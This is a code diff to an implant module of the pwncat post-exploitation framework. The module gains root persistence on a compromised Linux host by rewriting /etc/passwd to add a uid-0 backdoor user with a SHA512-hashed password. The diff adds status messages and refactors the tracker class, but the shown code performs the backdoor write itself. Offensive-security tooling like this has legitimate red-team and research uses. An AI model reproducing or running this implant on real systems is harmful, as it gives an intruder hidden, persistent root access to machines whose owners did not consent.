@@ -2,16 +2,16 @@
 import crypt
 
 from pwncat.facts import Implant, ImplantType
-from pwncat.modules.implant import ImplantModule
+from pwncat.modules import Status, Argument, ModuleFailed
 from pwncat.platform.linux import Linux
-from pwncat.modules import ModuleFailed, Argument
+from pwncat.modules.implant import ImplantModule
 
 
 class PasswdImplant(Implant):
     """ Implant tracker for a user added directly to /etc/passwd """
 
-    def __init__(self, source, implant_type, user, password, added_line):
-        super().__init__(source=source, typ=implant_type, uid=0)
+    def __init__(self, source, user, password, added_line):
+        super().__init__(source=source, types=["implant.replace"], uid=0)
 
         self.user = user
         self.password = password
@@ -84,12 +84,14 @@ class Module(ImplantModule):
             shell = "/bin/sh"
 
         try:
+            yield Status("reading passwd contents")
             with session.platform.open("/etc/passwd", "r") as filp:
                 passwd_contents = list(filp)
         except (FileNotFoundError, PermissionError):
             raise ModuleFailed("faild to read /etc/passwd")
 
         # Hash the password
+        yield Status("hashing password")
         backdoor_hash = crypt.crypt(backdoor_pass, crypt.METHOD_SHA512)
 
         # Store the new line we are adding
@@ -100,12 +102,11 @@ class Module(ImplantModule):
 
         try:
             # Write the new contents
+            yield Status("patching /etc/passwd")
             with session.platform.open("/etc/passwd", "w") as filp:
                 filp.writelines(passwd_contents)
 
             # Return an implant tracker
-            return PasswdImplant(
-                self.name, ImplantType.REPLACE, backdoor_user, backdoor_pass, new_line
-            )
+            return PasswdImplant(self.name, backdoor_user, backdoor_pass, new_line)
         except (FileNotFoundError, PermissionError):
             raise ModuleFailed("failed to write /etc/passwd")
